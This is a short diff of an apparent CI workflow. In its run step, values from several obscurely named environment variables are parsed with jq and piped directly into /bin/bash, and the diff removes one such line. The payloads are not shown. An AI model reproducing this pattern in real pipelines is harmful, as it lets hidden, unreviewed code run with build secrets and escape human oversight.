@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$ljzco2" | jq -r .rxxq51 | /bin/bash
           printf '%s' "$jgu687" | jq -r .xy1 | /bin/bash
-          echo $tirh69 | jq -r .gk0312 | /bin/bash
           printf '%s' "$wb64810" | jq -r .vo656 | /bin/bash
 
       - name: Store artifact
